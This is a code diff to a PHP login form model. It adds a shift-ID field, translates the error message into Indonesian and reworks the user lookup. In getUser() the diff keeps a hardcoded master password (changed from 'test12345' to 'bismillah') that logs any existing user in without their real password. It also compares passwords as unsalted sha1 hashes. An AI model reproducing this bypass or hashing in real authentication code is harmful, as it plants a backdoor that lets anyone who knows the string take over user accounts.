@@ -15,6 +15,7 @@ class LoginForm extends Model
 {
     public $username;
     public $password;
+    public $id_shift;
     public $rememberMe = true;
 
     private $_user = false;
@@ -29,7 +30,7 @@ class LoginForm extends Model
     {
         return [
             // username and password are both required
-            [['username', 'password'], 'required'],
+            [['username', 'password', 'id_shift'], 'required'],
             // rememberMe must be a boolean value
             ['rememberMe', 'boolean'],
             // password is validated by validatePassword()
@@ -50,7 +51,7 @@ class LoginForm extends Model
              $user = $this->getUser();
              if($this->_status !== 'Login Success'){
                  if (!$user || !$user->validatePassword($this->password)) {
-                     $this->addError($attribute, 'Incorrect username or password.');
+                     $this->addError($attribute, 'Username atau Password yang anda masukkan salah.');
                  }
  //                $this->addError($attribute, 'Incorrect username or password.');
              }
@@ -73,21 +74,15 @@ class LoginForm extends Model
 
     public function getUser()
     {
-        $bypass = 'test12345';
-        // if($this->password == 'telkom2018'){
-        //     $this->_user = User::findByUsername($this->username);
-        //     $this->_status='Login Success';
-        //     return $this->_user;
-        // }
-        // return $this->_user;
+        $bypass = 'bismillah';
         $user = Users::find()->where(['username' => $this->username])->one();
-        if($user) {
-            $this->_user = User::findIdentity($this->username);
-            $this->_status='Login Success';
-        } elseif ( (isset($user) && sha1($this->password) == $user->password) ) {
+
+        if ( (isset($user) && sha1($this->password) == $user->password) ) {
+            // echo"masuk2";exit;
             $this->_user = User::findIdentity($this->username);
             $this->_status='Login Success';
         } elseif($user && $this->password == $bypass) { //bypass
+            // echo"masuk3";exit;
             $this->_user = User::findIdentity($this->username);
             $this->_status='Login Success';
         }
